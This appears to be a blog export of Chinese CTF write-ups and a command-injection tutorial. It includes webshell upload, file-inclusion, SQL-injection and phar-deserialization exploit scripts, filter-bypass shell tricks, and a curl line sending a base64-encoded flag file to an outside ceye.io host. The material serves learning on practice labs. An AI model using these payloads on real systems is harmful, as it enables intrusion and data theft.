__ROOT__.substr($upload-&gt;rootPath,1).$info[&#39;file&#39;][&#39;savepath&#39;].$info[&#39;file&#39;][&#39;savename&#39;] ; echo json_encode(array(&quot;url&quot;=&gt;$url,&quot;success&quot;=&gt;1)); } } } 给出了文件上传的地址和信息$upload-&gt;rootPath = &#39;./Public/Uploads/&#39;;，访问发现没有WEB页面上传的点，应该是用脚本上传对这里的上传页面，由于这是一个thinkphp的站点，于是去看了thinkphp的内容，参考文章 这里对控制器说明比较详细。一般来说，ThinkPHP的控制器是一个类，而操作则是控制器类的一个公共方法。 下面就是一个典型的控制器类的定义： &lt;?php namespace Home\\Controller; use Think\\Controller; class IndexController extends Controller { public function hello(){ echo &#39;hello,thinkphp!&#39;; } } Home\\IndexController类就代表了Home模块下的Index控制器，而hello操作就是Home\\IndexController类的hello（公共）方法。 当访问 http://serverName/index.php/Home/Index/hello 后会输出： hello,thinkphp! 于是可以判断这个文件上传类的调用地址为：/index.php/home/index/upload。 不过限制了.php，仔细看才发现，代码只会过滤 $_FILES[&#39;file&#39;] 中的文件。所以可以上传两个文件，一个name为file的正常图片，另一个name为其他的webshell。但是最后会打印出 $_FILES[&#39;file&#39;] 的文件地址，而不会打印我们shell的地址，但是我们发现最后他对文件命名用uniqid()函数来命名的，这个函数是根据时间生成文件名，两个文件上传时间近可以通过爆破得到我们上传的shell的文件名。 import requests import re import time import sys reload(sys) sys.setdefaultencoding(&quot;utf8&quot;) url = &#39;http://2b9a88ad-f688-4ede-b6e3-ac18aae091f2.node3.buuoj.cn&#39; url_1 = url + &quot;/index.php/home/index/upload&quot; file = {&quot;file&quot;:(&quot;a.txt&quot;,&#39;a&#39;), &quot;file1&quot;:(&quot;a.php&quot;, &#39;&lt;?php eval($_GET[&quot;a&quot;]);&#39;)} r = requests.post(url=url_1,files=file) print r.content t1 = r.text.split(&quot;/&quot;)[-1].split(&quot;.&quot;)[0] t1 = int(t1,16) j = t1 while True: path = url + &quot;/Public/Uploads/2019-10-19/%s.php&quot; % hex(j)[2:-1] try: r = requests.get(path, timeout=1) except: continue if r.status_code != 404: print path print r.text break print j, hex(j)[2:-1], r.status_code j -= 1 得到flag","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://yoursite.com/tags/writeup/"}]},{"title":"buuctf 刷题记录","slug":"buuctf-刷题记录","date":"2019-09-09T10:14:32.000Z","updated":"2020-03-01T11:37:28.771Z","comments":true,"path":"2019/09/09/buuctf-刷题记录/","link":"","permalink":"http://yoursite.com/2019/09/09/buuctf-刷题记录/","excerpt":"前言发现了一个很好的平台，里面有一个大型比赛的题目复现，在这里记录一下刷题的记录。","text":"前言发现了一个很好的平台，里面有一个大型比赛的题目复现，在这里记录一下刷题的记录。 [HCTF 2018]WarmUp打开题目发现是一个笑脸，查看源代码发现了source.php里面记录这源码。 &lt;?php highlight_file(__FILE__); class emmm { public static function checkFile(&amp;$page) { $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;]; if (! isset($page) || !is_string($page)) { echo &quot;you can&#39;t see it&quot;; return false; } if (in_array($page, $whitelist)) { return true; } $_page = mb_substr( $page, 0, mb_strpos($page . &#39;?&#39;, &#39;?&#39;) ); if (in_array($_page, $whitelist)) { return true; } $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . &#39;?&#39;, &#39;?&#39;) ); if (in_array($_page, $whitelist)) { return true; } echo &quot;you can&#39;t see it&quot;; return false; } } if (! empty($_REQUEST[&#39;file&#39;]) &amp;&amp; is_string($_REQUEST[&#39;file&#39;]) &amp;&amp; emmm::checkFile($_REQUEST[&#39;file&#39;]) ) { include $_REQUEST[&#39;file&#39;]; exit; } else { echo &quot;&lt;br&gt;&lt;img src=\\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\&quot; /&gt;&quot;; } ?&gt; 发现是phpmyadmin4.8.1的文件包含漏洞改了一点。 我们需要传递一个file参数。如果参数值在白名单$whitelist中就会直接return true，但这里考虑到了可能带参数的情况，所以有了下面的判断 $_page = mb_substr( $page, 0, mb_strpos($page . &#39;?&#39;, &#39;?&#39;) ); if (in_array($_page, $whitelist)) { return true; } $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . &#39;?&#39;, &#39;?&#39;) ); if (in_array($_page, $whitelist)) { return true; } $_page是取出$page问号前的东西，是考虑到有参数的情况，只要$_page在白名单中就直接return true但还考虑了url编码的情况，所以如果这步判断未成功，下一步又进行url解码urldecode($page) 所以传入二次编码后的内容，会让checkFile()这个函数返回true，但实际包含的内容却不是白名单中的文件例如传入?file=source.php%253f由于服务器会自动解码一次，所以在checkFile()中，$page的值一开始会是source.php%3f，又一次url解码后变成了db_datadict.php?，这次便符合了?前内容在白名单的要求，函数返回true但在index.php中$_REQUEST[‘target’]仍然是source.php%3f，而且会被include，通过目录穿越，就可造成任意文件包含最终payload: file=source.php$253f/../../../../../ffffllllaaaagggg 随便注听名字就是一道注入的题目： 打开之后是一个,搜索框 提交1发现会输出一个对应的值，尝试一下1&#39;发现会得到报错，尝试一下万能密码1&#39; or &#39;1&#39;=&#39;1，发现能够把当前表所有的值全部输出出来，发现没有flag的值，意识到flag不再当前查询的表中，应该是在其他的表里面存着的。 尝试注入时，发现存在过滤： return preg_match(&quot;/select|update|delete|drop|insert|where|\\./i&quot;, $inject); 发现过滤了select,.,where等，这就很难进行正常的注入了，需要另想办法。 尝试过报错注入，虽然能够得到数据库信息，但是过滤了select就很难进行进一步的注入。 通过多次的尝试，发现可以进行堆叠注入。 方法一通过堆叠注入，可以将sql注入的语句转换为16进制表示也可以bypass 1&#39;;set @t=0x73656c65637420312c323b;prepare x from @t;execute x; 但是尝试的时候发现过滤回显 strstr($inject, &quot;set&quot;) &amp;&amp; strstr($inject, &quot;prepare&quot;) 这是个strstr函数呀！可以用大小写绕过！ 将查询的字符串转换为16进制 payload = &quot;chuddy&#39;;set @s=%s;PREPARE a FROM @s;EXECUTE a;&quot; exp = &#39;select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()&#39; #exp = &quot;select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME=&#39;1919810931114514&#39;&quot; #exp = &quot;select flag from `1919810931114514`&quot; my_payload = payload%(&quot;0x&quot;+exp.encode(&#39;hex&#39;)) print my_payload payload为: 注表名： chuddy&#39;;set @s=0x73656c6563742067726f75705f636f6e636174285441424c455f4e414d45292066726f6d20696e666f726d6174696f6e5f736368656d612e5441424c4553207768657265205441424c455f534348454d413d64617461626173652829;PREPARE a FROM @s;EXECUTE a; 然后进行注列名 chuddy&#39;;set @s=0x73656c6563742067726f75705f636f6e63617428434f4c554d4e5f4e414d45292066726f6d20696e666f726d6174696f6e5f736368656d612e434f4c554d4e53207768657265205441424c455f4e414d453d273139313938313039333131313435313427;PREPARE a FROM @s;EXECUTE a; 得到flag chuddy&#39;;set @s=0x73656c65637420666c61672066726f6d20603139313938313039333131313435313460;PREPARE a FROM @s;EXECUTE a; 方法二通过堆叠注入，尝试用char()进行绕过。 通过对sql注入的语句，转换成为单个的ascii码，然后通过char()函数进行转换以及利用concat()函数进行重新拼接，来bypass。 可以参考飘零师傅的博客。 进行编码的脚本： payload = &quot;0&#39;;set @s=concat(%s);PREPARE a FROM @s;EXECUTE a;&quot; exp = &#39;select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()&#39; #exp = &quot;select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME=&#39;1919810931114514&#39;&quot; #exp = &quot;select flag from `1919810931114514`&quot; res = &#39;&#39; for i in exp: res += &quot;char(%s),&quot;%(ord(i)) my_payload = payload%(res[:-1]) print my_payload getflag 0&#39;;set @s=concat(char(115),char(101),char(108),char(101),char(99),char(116),char(32),char(102),char(108),char(97),char(103),char(32),char(102),char(114),char(111),char(109),char(32),char(96),char(49),char(57),char(49),char(57),char(56),char(49),char(48),char(57),char(51),char(49),char(49),char(49),char(52),char(53),char(49),char(52),char(96));PREPARE a FROM @s;EXECUTE a; 方法三过滤的内容为： return preg_match(&quot;/select|update|delete|drop|insert|where|\\./i&quot;, $inject); 发现这里面没有过滤一些show,alter等一些字段，我们可以通过修改表名，和表的字段名，来进行换表，得到flag。 首先通过报错注入查看库名： 1&#39;and extractvalue(1, concat(0x7e, (database()),0x7e)) 库名为：supersqli 查表名 chuddy&#39;; show tables; 返回结果为： array(1) { [0]=&gt; string(16) &quot;1919810931114514&quot; } array(1) { [0]=&gt; string(5) &quot;words&quot; } 查表结构： 1&#39;;show create table words;show create table `1919810931114514`; 表结构为： array(2) { [0]=&gt; string(5) &quot;words&quot; [1]=&gt; string(114) &quot;CREATE TABLE `words` ( `id` int(10) NOT NULL, `data` varchar(20) NOT NULL ) ENGINE=MyISAM DEFAULT CHARSET=utf8&quot; } array(2) { [0]=&gt; string(16) &quot;1919810931114514&quot; [1]=&gt; string(101) &quot;CREATE TABLE `1919810931114514` ( `flag` varchar(100) NOT NULL ) ENGINE=MyISAM DEFAULT CHARSET=utf8&quot; } 我们可以将words表改名为aaa,将flag所在的表改名为word。 注意，word表的查询时查的id，我们还需要给flag添加一个字段名。来保证查询语句中的id可以查询。 最终payload为： 1&#39;;alter table `1919810931114514` add(id int default 1);alter table words rename aaa;alter table `1919810931114514` rename words;# 然后查询1就可以得到flag了。 Hack World打开页面发现： 给出了flag在数据库flag表flag列中，通过测试发现，输入1.会返回Hello, glzjin wants a girlfriend.输入2会返回Do you want to be my girlfriend?,通过这两个输入返回的结果不一样我们可以测试到了输入if(bool,1,2)来进行注入，通过测试我们发现过滤了空格，/*，由于这里是通过post传递的参数，我们可以通过()来进行绕过。最终payload为：if((ascii(substr((select(flag)from(flag)),1,1))&gt;1),1,2). 盲注脚本为： #coding:UTF-8 import requests import re import sys url = &quot;http://0b2c104a-3936-43da-ad47-c05c34f80ed9.node1.buuoj.cn/index.php&quot; flag=&quot;&quot; for i in range(27,40): print i # time.sleep(1) for j in range(37,128): pay = &#39;if((ascii(substr((select(flag)from(flag)),&#39;+str(i+1)+&#39;,1))=&#39;+str(j)+&#39;),1,2)&#39; # print pay data = { &#39;id&#39; : pay } res = requests.post(url=url,data=data) # print res.text # exit() if &#39;glzjin &#39; in res.text: flag += chr(j) print flag break print flag Dropbox打开页面发现是一个登陆框，通关尝试，没有发现注入点，于是就常规的注册登陆。发现是一个文件管理页面。 上传的文件有下载和删除的功能。尝试下载功能。发现可以任意文件下载通过控制filename这个参数可以实现任意文件读取。，于是我们可以把想过的文件都下载下来。其中有index.php,class.php,download.php, delete.php等。class.php &lt;?php error_reporting(0); $dbaddr = &quot;127.0.0.1&quot;; $dbuser = &quot;root&quot;; $dbpass = &quot;root&quot;; $dbname = &quot;dropbox&quot;; $db = new mysqli($dbaddr, $dbuser, $dbpass, $dbname); //链接数据库 class User { public $db; public function __construct() { //初始化$db global $db; $this-&gt;db = $db; } public function user_exist($username) { //判断用户是否存在 利用了预编译的方法，所有没有找到注入点 $stmt = $this-&gt;db-&gt;prepare(&quot;SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;&quot;); $stmt-&gt;bind_param(&quot;s&quot;, $username); $stmt-&gt;execute(); $stmt-&gt;store_result(); $count = $stmt-&gt;num_rows; if ($count === 0) { return false; } return true; } public function add_user($username, $password) { //注册用户 if ($this-&gt;user_exist($username)) { return false; } $password = sha1($password . &quot;SiAchGHmFx&quot;); $stmt = $this-&gt;db-&gt;prepare(&quot;INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);&quot;); $stmt-&gt;bind_param(&quot;ss&quot;, $username, $password); $stmt-&gt;execute(); return true; } public function verify_user($username, $password) { //用户登陆的判断 if (!$this-&gt;user_exist($username)) { return false; } $password = sha1($password . &quot;SiAchGHmFx&quot;); $stmt = $this-&gt;db-&gt;prepare(&quot;SELECT `password` FROM `users` WHERE `username` = ?;&quot;); $stmt-&gt;bind_param(&quot;s&quot;, $username); $stmt-&gt;execute(); $stmt-&gt;bind_result($expect); $stmt-&gt;fetch(); if (isset($expect) &amp;&amp; $expect === $password) { return true; } return false; } public function __destruct() { $this-&gt;db-&gt;close(); //调用其他类的close方法 } } class FileList { //这是文件的显示类 private $files; private $results; private $funcs; public function __construct($path) { $this-&gt;files = array(); $this-&gt;results = array(); $this-&gt;funcs = array(); $filenames = scandir($path); $key = array_search(&quot;.&quot;, $filenames); unset($filenames[$key]); $key = array_search(&quot;..&quot;, $filenames); unset($filenames[$key]); foreach ($filenames as $filename) { $file = new File(); $file-&gt;open($path . $filename); array_push($this-&gt;files, $file); $this-&gt;results[$file-&gt;name()] = array(); } } public function __call($func, $args) { array_push($this-&gt;funcs, $func); foreach ($this-&gt;files as $file) { $this-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func(); } } public function __destruct() { $table = &#39;&lt;div id=&quot;container&quot; class=&quot;container&quot;&gt;&lt;div class=&quot;table-responsive&quot;&gt;&lt;table id=&quot;table&quot; class=&quot;table table-bordered table-hover sm-font&quot;&gt;&#39;; $table .= &#39;&lt;thead&gt;&lt;tr&gt;&#39;; foreach ($this-&gt;funcs as $func) { $table .= &#39;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;&#39; . htmlentities($func) . &#39;&lt;/th&gt;&#39;; } $table .= &#39;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;Opt&lt;/th&gt;&#39;; $table .= &#39;&lt;/thead&gt;&lt;tbody&gt;&#39;; foreach ($this-&gt;results as $filename =&gt; $result) { $table .= &#39;&lt;tr&gt;&#39;; foreach ($result as $func =&gt; $value) { $table .= &#39;&lt;td class=&quot;text-center&quot;&gt;&#39; . htmlentities($value) . &#39;&lt;/td&gt;&#39;; } $table .= &#39;&lt;td class=&quot;text-center&quot; filename=&quot;&#39; . htmlentities($filename) . &#39;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;download&quot;&gt;涓嬭浇&lt;/a&gt; / &lt;a href=&quot;#&quot; class=&quot;delete&quot;&gt;鍒犻櫎&lt;/a&gt;&lt;/td&gt;&#39;; $table .= &#39;&lt;/tr&gt;&#39;; } echo $table; } } class File { public $filename; public function open($filename) { $this-&gt;filename = $filename; if (file_exists($filename) &amp;&amp; !is_dir($filename)) { //判断文件是否存在 return true; } else { return false; } } public function name() { return basename($this-&gt;filename); //返回路径中的文件名部分。 /home/admin.php 返回admin.php } public function size() { //判断文件大小 $size = filesize($this-&gt;filename); $units = array(&#39; B&#39;, &#39; KB&#39;, &#39; MB&#39;, &#39; GB&#39;, &#39; TB&#39;); for ($i = 0; $size &gt;= 1024 &amp;&amp; $i &lt; 4; $i++) $size /= 1024; return round($size, 2).$units[$i]; } public function detele() { //删除文件 unlink($this-&gt;filename); } public function close() { //返回文件 return file_get_contents($this-&gt;filename); } } ?&gt; 通过对class.php文件的审计，发现这里使用了预编译的方法，，所以登陆处没有sql漏洞。但是注意到 File类中的close方法，这个方法被调用可以获得文件的内容，如果能够触发这个方法，就有机会得到flag。 发现download.php里面调用了这个方法。 由于这里传递的filename过滤了flag这个关键字符串，所以不能通过文件下载来直接下载文件。download.php $file = new File(); $filename = (string) $_POST[&#39;filename&#39;]; if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename) &amp;&amp; stristr($filename, &quot;flag&quot;) === false) { //文件名不能有flag Header(&quot;Content-type: application/octet-stream&quot;); Header(&quot;Content-Disposition: attachment; filename=&quot; . basename($filename)); echo $file-&gt;close(); //这里调用了close函数 可以打印文件内容 } else { echo &quot;File not exist&quot;; } 但是其他的文件都能够读取。 由于file类中的close方法，利用的是file_get_contents这个函数，也是受Phar反序列化影响的，如果能触发该方法，就有可能获取flag。 User类中存在调用close方法，但是该方法在对象销毁时执行 Filelist类中，存在call魔术方法，但是类没有close方法。 public function __call($func, $args) { array_push($this-&gt;funcs, $func); foreach ($this-&gt;files as $file) { $this-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func(); } } php的call魔术方法,`call($func,$args)`会在对象调用的方法不存在时，自动执行。这里的call方法的作用就是，当调用的对象没有这个方法，首先把要调用的方法，压进$this-&gt;funcs中，然后遍历每一个文件，让每一个文件，都去调用刚才的方法。 如果一个Filelist对象调用了close()方法，根据call方法的代码可以知道，文件的close方法会被执行，就可能拿到flag。 这是一个大佬画的图，会更好理解： 可以利用Phar反序列化来弄exp: &lt;?php class User { public $db; } class File { public $filename; } class FileList { private $files; private $results; private $funcs; public function __construct() { $file = new File(); $file-&gt;filename = &#39;/flag.txt&#39;; $this-&gt;files = array($file); $this-&gt;results = array(); $this-&gt;funcs = array(); } } @unlink(&quot;phar.phar&quot;); $phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar $phar-&gt;startBuffering(); $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub $o = new User(); $o-&gt;db = new FileList(); $phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest $phar-&gt;addFromString(&quot;exp.txt&quot;, &quot;test&quot;); //添加要压缩的文件 //签名自动计算 $phar-&gt;stopBuffering(); ?&gt; 把文件改名为phar.png,然后上传，在delete删除该文件，抓包改数据，就可以得到flag","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://yoursite.com/tags/writeup/"}]},{"title":"命令注入的绕过姿势","slug":"命令注入的绕过姿势","date":"2019-07-29T13:46:40.000Z","updated":"2019-08-21T07:45:49.287Z","comments":true,"path":"2019/07/29/命令注入的绕过姿势/","link":"","permalink":"http://yoursite.com/2019/07/29/命令注入的绕过姿势/","excerpt":"命令注入的绕过姿势前言命令注入是我们常见的漏洞，在CTF中也经常见到。这里学习一波命令注入的骚姿势。","text":"命令注入的绕过姿势前言命令注入是我们常见的漏洞，在CTF中也经常见到。这里学习一波命令注入的骚姿势。 命令注入中常用的符号说到命令注入，我们不得不提到命令注入中几个常用的符号。 &amp;&amp; 表示将任务置于后台执行 ➜ ~ whoami &amp; ls [1] 1782 root [1] + 1782 done whoami anaconda-ks.cfg install.log install.log.syslog |( 管道符号)| 表示管道，上一条命令的输出，作为下一条命令的参数 ➜ ~ ls | whoami root ➜ ~ whoami | ls anaconda-ks.cfg install.log install.log.syslog 执行的是|后面的命令。 &amp;&amp;语法格式如下： command1 &amp;&amp; command2 [&amp;&amp; command3 ...] 1 命令之间使用 &amp;&amp; 连接，实现逻辑与的功能。 2 只有在 &amp;&amp; 左边的命令返回真（命令返回值 $? == 0），&amp;&amp; 右边的命令才会被执行。 3 只要有一个命令返回假（命令返回值 $? == 1），后面的命令就不会被执行。 只有前面的命令是真，后面的命令才会被执行 ➜ ~ cat aaa &amp;&amp; ls cat: aaa: 没有那个文件或目录 ➜ ~ touch a.txt ➜ ~ echo &#39;abc&#39; &gt; a.txt ➜ ~ cat a.txt &amp;&amp; whoami abc root ||语法格式如下： command1 || command2 [|| command3 ...] 1 命令之间使用 || 连接，实现逻辑或的功能。 2 只有在 || 左边的命令返回假（命令返回值 $? == 1），|| 右边的命令才会被执行。这和 c 语言中的逻辑或语法功能相同，即实现短路逻辑或操作。 3 只要有一个命令返回真（命令返回值 $? == 0），后面的命令就不会被执行。 该用法和&amp;&amp;正好相反，只有前面的命令是假的，后面的命令才会被执行。 ➜ ~ cat a.txt || whoami abc ➜ ~ cat a || whoami cat: a: 没有那个文件或目录 root ➜ ~ ；(分号)多行语句用换行区分代码快，单行语句一般要用到分号来区分代码块 无论前面，命令是否为真，都会被执行 ➜ ~ cat a.txt;whoami abc root ➜ ~ cat a;whoami cat: a: 没有那个文件或目录 root 和$()在bash中，$( )与` `（反引号）都是用来作命令替换的。 各自的优缺点： 1. ` ` 基本上可用在全部的 unix shell 中使用，若写成 shell脚本，其移植性比较高，但反单引号容易打错或看错。 2. $()更有可读性，但是$()并不是所有shell都支持。 root@kali:~/chuddy# $(whoami) bash: root：未找到命令 root@kali:~/chuddy# $(cat a.txt) bash: abc：未找到命令 root@kali:~/chuddy# $(ls) bash: 1562578910726843：未找到命令 root@kali:~/chuddy# $(ls) bash: 1562578910726843：未找到命令 root@kali:~/chuddy# echo `ls` 1562578910726843 a.txt ctf rip-git.pl web root@kali:~/chuddy# `ls` bash: 1562578910726843：未找到命令 root@kali:~/chuddy# 尝试发现如果直接使用，发现能回返回第一行的结果以及bash: root：未找到命令,可以和echo一起使用。echo $(ls) ()和{}如果希望把几个命令合在一起执行，shell提供了两种方法。既可以在当前shell也可以在子shell中执行一组命令。 (command1;command2;command3....) { command1;command2;command3…} #第一条命令必须与左边的括号有一个空格，最后一条命令一定要有分号 相同点： ()和{}都是把一串的命令放在括号里面,并且命令之间用;号隔开 不同点 ()只是对一串命令重新开一个子shell进行执行,{}对一串命令在当前shell执行 ()最后一个命令可以不用分号,{}最后一个命令要用分号 ()里的第一个命令和左边括号不必有空格,{}的第一个命令和左括号之间必须要有一个空格 ()和{}中括号里面的某个命令的重定向只影响该命令,但括号外的重定向则影响到括号里的所有命令 root@kali:~/chuddy# (ls;whoami) 1562578910726843 a.txt ctf rip-git.pl web root root@kali:~/chuddy# {ls;whoami} bash: {ls：未找到命令 bash: whoami}：未找到命令 root@kali:~/chuddy# {ls;whoami;} bash: 未预期的符号“}”附近有语法错误 root@kali:~/chuddy# { ls;whoami;} 1562578910726843 a.txt ctf rip-git.pl web root root@kali:~/chuddy# { ls;whoami} &gt; ; bash: 未预期的符号“;”附近有语法错误 root@kali:~/chuddy# { ls;whoami;} 1562578910726843 a.txt ctf rip-git.pl web root root@kali:~/chuddy# 测试发现bash下对{}是又要求的，但是我使用zsh主题的情况下，是不受{}规则的影响的 ➜ ~ { ls;whoami} anaconda-ks.cfg a.txt install.log install.log.syslog root ➜ ~ { ls;whoami} anaconda-ks.cfg a.txt install.log install.log.syslog root ➜ ~ {ls;whoami} anaconda-ks.cfg a.txt install.log install.log.syslog root ➜ ~ {ls;whoami;} anaconda-ks.cfg a.txt install.log install.log.syslog root ➜ ~ Shell 输入/输出重定向大多数 UNIX 系统命令从你的终端接受输入并将所产生的输出发送回​​到您的终端。一个命令通常从一个叫标准输入的地方读取输入，默认情况下，这恰好是你的终端。同样，一个命令通常将其输出写入到标准输出，默认情况下，这也是你的终端。 使用比较多的命令： 命令说明： command &gt; file：将输出重定向到 file。 command &lt; file：将输入重定向到 file。 command &gt;&gt; file：将输出以追加的方式重定向到 file。 ➜ ~ echo &#39;abcd&#39; &lt; a.txt abcd ➜ ~ cat a.txt abc ➜ ~ echo &#39;123&#39; &gt;a.txt ➜ ~ cat a.txt 123 ➜ ~ echo &#39;abc&#39; &gt;&gt; a.txt ➜ ~ cat a.txt 123 abc ➜ ~ 直接用&gt; 会覆盖原文件的内容，用&gt;&gt;能够追加写入文件，不会覆盖原文件。 一些常见的限制通配符的使用可以绕过一些关键字的限制。 ?：匹配任何一个字符 存在文件flag.php,并且过滤了关键字flag的情况下进行文件读取 ➜ ~ cat f?a?.??? flag{abc_123_haha} ➜ ~ cat ???????? //会读取所有他匹配的文档 flag{abc_123_haha} ➜ ~ touch fake.txt ➜ ~ echo &#39;this_is_a_text&#39; &gt;fake.txt ➜ ~ cat ???????? this_is_a_text flag{abc_123_haha} ➜ ~ *：匹配任何字符串／文本，包括空字符串 ➜ ~ cat f* //会读取所有他匹配的文档 this_is_a_text flag{abc_123_haha} ➜ ~ cat fl* flag{abc_123_haha} ➜ ~ cat fla* flag{abc_123_haha} ➜ ~ []和{}的使用 [....]：匹配范围中任何一个字符[a-z]：匹配a-z范围中任何一个字符 {a,b}：对以逗号分割的文件列表进行拓展 ➜ ~ cat fl[abc]g.php flag{abc_123_haha} ➜ ~ cat fl[a-z]g.php flag{abc_123_haha} ➜ ~ cat fl[bc]g.php zsh: no matches found: fl[bc]g.php ➜ ~ cat fl{a,b,c}g.php flag{abc_123_haha} cat: flbg.php: 没有那个文件或目录 cat: flcg.php: 没有那个文件或目录 ➜ ~ cat fl{b,c}g.php cat: flbg.php: 没有那个文件或目录 cat: flcg.php: 没有那个文件或目录 ➜ ~ 它们的区别：{...}与[...]有一个很重要的区别。如果匹配的文件不存在，[...]会失去模式的功能，变成一个单纯的字符串，而{...}依然可以展开。 注意 在使用过程中应该注意： 上面所有通配符只匹配单层路径，不能跨目录匹配，即无法匹配子目录里面的文件。或者说，?或*这样的通配符，不能匹配路径分隔符（/）。 如果要匹配子目录里面的文件，可以写成下面这样。 ➜ ~ ls */*.txt admin/admin.txt ➜ ~ ls ?????/*.txt admin/admin.txt ➜ ~ ls ./?????/*.txt ./admin/admin.txt 可用于文件名。 Bash 允许文件名使用通配符。这时，引用文件名的时候，需要把文件名放在单引号里面。 ➜ ~touch a* ➜ ~ ls ➜ ~touch &#39;a*&#39; ➜ ~ ls a* 空格绕过使用&lt;或者&lt;&gt; ➜ ~ cat&lt;a.txt abc ➜ ~ cat&lt;&gt;a.txt #需要写的权限 abc ➜ ~ 使用IFS root@kali:~/chuddy# cat$IFSa.txt bash: cat.txt：未找到命令 root@kali:~/chuddy# cat$IFS$9a.txt abc root@kali:~/chuddy# cat${IFS}a.txt abc root@kali:~/chuddy# cat$IFS./a.txt abc oot@kali:~/chuddy# cat$IFS\\./a.txt abc 在url的编码绕过 %20(space) + %09(tab) %3c(&lt;) 花括号拓展{OS_COMMAND,ARGUMENT} 在Linux bash中还可以使用{cat,/etc/passwd}来绕过，如果使用zsh主题就不能执行。 root@kali:~/chuddy# {cat,a.txt} abc 变量控制 root@kali:~/chuddy# X=$&#39;cat\\x09./a.txt&#39;&amp;&amp;$X abc root@kali:~/chuddy# X=$&#39;cat\\x20./a.txt&#39;&amp;&amp;$X abc 命令分隔与执行多条命令在Unix上: %0a //没成功 %0d //没成功 ; &amp; | || &amp;&amp; $(shell_command) `shell_command` { shell_command;} 在Windows上： %0a &amp; | %1a - 一个神奇的角色，作为.bat文件中的命令分隔符 关键字过滤绕过空变量 使用$*和$@，$x(x代表1-9),${x}(x&gt;=10)(我尝试小于10也是可以的)PS：因为在没有传参的情况下，上面的特殊变量都是为空的 root@kali:~/chuddy# c$*at a.txt abc root@kali:~/chuddy# ca$@t a.txt abc root@kali:~/chuddy# ca$2t a.txt abc root@kali:~/chuddy# ca$10t a.txt bash: ca0t：未找到命令 root@kali:~/chuddy# ca${10}t a.txt abc root@kali:~/chuddy# ca${7}t a.txt abc 反斜杠 root@kali:~/chuddy# ca\\t a.txt abc 变量替换 root@kali:~/chuddy# a=ca;b=t;c=a.txt;$a$b $c abc root@kali:~/chuddy# a=&quot;abctx. &quot;;b=${a:2:1}${a:0:1}${a:3:1}${a:6:1}${a:0:1}${a:5:1}${a:3:1}${a:4:1}${a:3:1};$b //b=cat a.txt abc 引号 root@kali:~/chuddy# c&#39;a&#39;t a.txt abc root@kali:~/chuddy# c&quot;a&quot;t a.txt abc 编码绕过 base64编码： root@kali:~/chuddy# echo &#39;cat a.txt&#39;| base64 Y2F0IGEudHh0Cg== root@kali:~/chuddy# `echo &#39;Y2F0IGEudHh0Cg==&#39; | base64 -d` abc 十六进制： root@kali:~/chuddy# echo &#39;cat a.txt&#39; | xxd -p 63617420612e7478740a root@kali:~/chuddy# `echo &#39;0x63617420612e7478740a&#39;| xxd -r -p` abc root@kali:~/chuddy# root@kali:~/chuddy# $(printf &quot;\\x63\\x61\\x74\\x20\\x61\\x2e\\x74\\x78\\x74\\x0a&quot;) abc 利用已有资源与字符 root@kali:~/chuddy# echo $PATH /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin root@kali:~/chuddy# echo $PATH|cut -c 8 c root@kali:~/chuddy# echo $PATH|cut -c 9 a root@kali:~/chuddy# `echo $PATH|cut -c 8`at a.txt abc root@kali:~/chuddy# c`echo $PATH|cut -c 9`t a.txt abc","categories":[],"tags":[]},{"title":"命令注入","slug":"命令注入","date":"2019-07-29T09:36:38.000Z","updated":"2019-08-21T07:46:00.335Z","comments":true,"path":"2019/07/29/命令注入/","link":"","permalink":"http://yoursite.com/2019/07/29/命令注入/","excerpt":"命令注入简介命令注入(也称为shell注入)是一种web安全漏洞，它允许攻击者在运行应用程序的服务器上执行任意操作系统(OS)命令，通常会完全破坏应用程序及其所有数据。通常，攻击者可以利用OS命令注入漏洞来破坏宿主基础设施的其他部分，利用信任关系将攻击转移到组织内的其他系统。","text":"命令注入简介命令注入(也称为shell注入)是一种web安全漏洞，它允许攻击者在运行应用程序的服务器上执行任意操作系统(OS)命令，通常会完全破坏应用程序及其所有数据。通常，攻击者可以利用OS命令注入漏洞来破坏宿主基础设施的其他部分，利用信任关系将攻击转移到组织内的其他系统。 在Web应用中，有时候会用到一些命令执行的函数，如php中system、exec、shell_exec等，当对用户输入的命令没有进行限制或者过滤不严导致用户可以执行任意命令时，就会造成命令执行漏洞。 常见命令执行函数 system() passthru() exec() pcntl_exec() shell_exec() popen() proc_open() `反引号 ob_start() mail函数+LD_PRELOAD执行系统命令 system()函数定义： string system ( string $command [, int &amp;$return_var ] ) command是要执行的命令。return_var，如果提供 return_var 参数， 则外部命令执行后的返回状态将会被设置到此变量中。 &lt;?php system(&quot;whoami&quot;); ?&gt; 会看到运行了shell命令，并打印回显到页面上。 passthru()函数定义： void passthru ( string $command [, int &amp;$return_var ] ) command是要执行的命令。return_var，如果提供 return_var 参数， Unix 命令的返回状态会被记录到此参数。 &lt;?php passthru(&quot;whoami&quot;); ?&gt; exec()函数定义： string exec ( string $command [, array &amp;$output [, int &amp;$return_var ]] ) exec() 执行 command 参数所指定的命令。 &lt;?php echo exec(&quot;whoami&quot;); ?&gt; 该函数不能直接回显，需要手动输出。。。 可以利用ceye： data=$(cat flag.php | base64);curl http://36rdia.ceye.io/？data=$data; 